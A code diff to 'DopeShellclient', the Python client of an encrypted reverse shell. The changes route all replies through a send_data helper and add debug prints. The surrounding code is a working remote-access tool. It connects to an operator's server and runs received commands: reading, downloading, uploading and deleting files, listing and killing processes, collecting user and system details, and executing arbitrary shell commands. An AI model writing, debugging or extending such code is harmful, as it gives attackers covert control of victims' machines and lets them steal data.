@@ -22,6 +22,10 @@ class DopeShellclient:
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     def send_data(self, data):
+        print(type(data))
+        if (type(data) == str):
+            print('converting to bytes!')
+            data = data.encode('utf-8')
         encrypted_data = self.encrypt(data)
         # Send the length of the data first
         self.sock.send(struct.pack('>I', len(encrypted_data)))
@@ -71,7 +75,7 @@ class DopeShellclient:
         self.sock.connect((self.server_ip, self.server_port))
         while True:
             command = self.decrypt(self.sock.recv(4096)).decode('utf-8')
-            
+            print(command)
             if command.lower() == 'exit':
                 break
 
@@ -90,7 +94,8 @@ class DopeShellclient:
                     f"Current User: {getpass.getuser()}\n"
                     f"Local IP Address: {local_ip}\n"
                 )
-                self.sock.send(self.encrypt(client_info.encode('utf-8')))
+                print(type(client_info))
+                self.send_data(client_info)
 
             elif command.lower().startswith('ls'):
                 directory = command.split()[1] if len(command.split()) > 1 else '.'
@@ -98,29 +103,33 @@ class DopeShellclient:
                     files = "\n".join(os.listdir(directory))
                 except FileNotFoundError:
                     files = f"[-] Directory '{directory}' not found."
-                self.sock.send(self.encrypt(files.encode('utf-8')))
+                self.send_data(files)
 
             elif command.lower() == 'pwd':
                 cwd = os.getcwd()
-                self.sock.send(self.encrypt(cwd.encode('utf-8')))
+                self.send_data(cwd)
 
             elif command.lower().startswith('cd'):
                 directory = command.split()[1] if len(command.split()) > 1 else '.'
                 try:
                     os.chdir(directory)
-                    self.sock.send(self.encrypt(b"[+] Changed directory."))
+                    message = "[+] Changed directory."
                 except FileNotFoundError:
-                    self.sock.send(self.encrypt(f"[-] Directory '{directory}' not found.".encode('utf-8')))
+                    message = f"[-] Directory '{directory}' not found"
+                self.send_data(message)
 
             elif command.lower().startswith('download'):
                 _, file_path = command.split()
                 try:
                     with open(file_path, 'rb') as f:
                         while chunk := f.read(4096):
-                            self.sock.send(self.encrypt(chunk))
-                    self.sock.send(self.encrypt(b'EOF'))
+                            # self.sock.send(self.encrypt(chunk))
+                            self.send_data(chunk)
+                    # self.sock.send(self.encrypt(b'EOF'))
+                    self.send_data(b'EOF')
                 except FileNotFoundError:
-                    self.sock.send(self.encrypt(b"[-] File not found."))
+                    # self.sock.send(self.encrypt(b"[-] File not found."))
+                    self.send_data("[-] File not found.")
 
             elif command.lower().startswith('upload'):
                 _, file_name = command.split()
@@ -139,7 +148,7 @@ class DopeShellclient:
                     output = f"Directory '{directory}' created successfully."
                 except Exception as e:
                     output = f"Failed to create directory '{directory}': {e}"
-                self.sock.send(self.encrypt(output.encode('utf-8')))
+                self.send_data(output)
 
             elif command.lower().startswith('delete'):
                 _, file_path = command.split(' ', 1)
@@ -154,7 +163,7 @@ class DopeShellclient:
                 processes = ""
                 for proc in psutil.process_iter(['pid', 'name', 'username']):
                     processes += f"PID: {proc.info['pid']}, Name: {proc.info['name']}, User: {proc.info['username']}\n"
-                self.send_data(processes.encode('utf-8'))
+                self.send_data(processes)
 
             elif command.lower().startswith('kill'):
                 _, pid = command.split(' ', 1)
@@ -163,7 +172,7 @@ class DopeShellclient:
                     output = f"Process {pid} killed successfully."
                 except Exception as e:
                     output = f"Failed to kill process {pid}: {e}"
-                self.sock.send(self.encrypt(output.encode('utf-8')))
+                self.send_data(output)
 
             elif command.lower().startswith('cat'):
                 try:
@@ -174,10 +183,10 @@ class DopeShellclient:
                         self.send_data(file_content)
                     else:
                         error_message = f"File {file_path} does not exist or is not a file."
-                        self.send_data(error_message.encode('utf-8'))
+                        self.send_data(error_message)
                 except Exception as e:
                     error_message = f"Error reading file: {str(e)}"
-                    self.send_data(error_message.encode('utf-8'))
+                    self.send_data(error_message)
 
             elif command.lower() == 'netstat':
                 netstat_output = subprocess.check_output('netstat -an', shell=True)
@@ -186,7 +195,8 @@ class DopeShellclient:
             elif command.lower() == 'clear':
                 # Clear screen command for the client shell (may not be fully visible in reverse shell setup)
                 output = "\033c"
-                self.sock.send(self.encrypt(output.encode('utf-8')))
+                # self.sock.send(self.encrypt(output.encode('utf-8')))
+                self.send_data(output)
 
             elif command.lower() in ['ifconfig', 'ipconfig']:
                 if platform.system() == 'Windows':
@@ -205,7 +215,7 @@ class DopeShellclient:
                     self.send_data(matches)
                 else:
                     output = f"No matches found for '{filename}'."
-                    self.sock.send(self.encrypt(output.encode('utf-8')))
+                    self.send_data(output)
 
             elif command.lower() == 'sysinfo':
                 sys_info = (
@@ -215,11 +225,13 @@ class DopeShellclient:
                     f"RAM: {round(psutil.virtual_memory().total / (1024**3), 2)} GB\n"
                     f"Disk: {round(psutil.disk_usage('/').total / (1024**3), 2)} GB\n"
                 )
-                self.sock.send(self.encrypt(sys_info.encode('utf-8')))
+                self.send_data(sys_info)
 
             else:
                 output = self.execute_command(command)
-                self.sock.send(self.encrypt(output))
+                print(type(output))
+                self.send_data(output)
+                # self.sock.send(self.encrypt(output))
 
         self.sock.close()
 
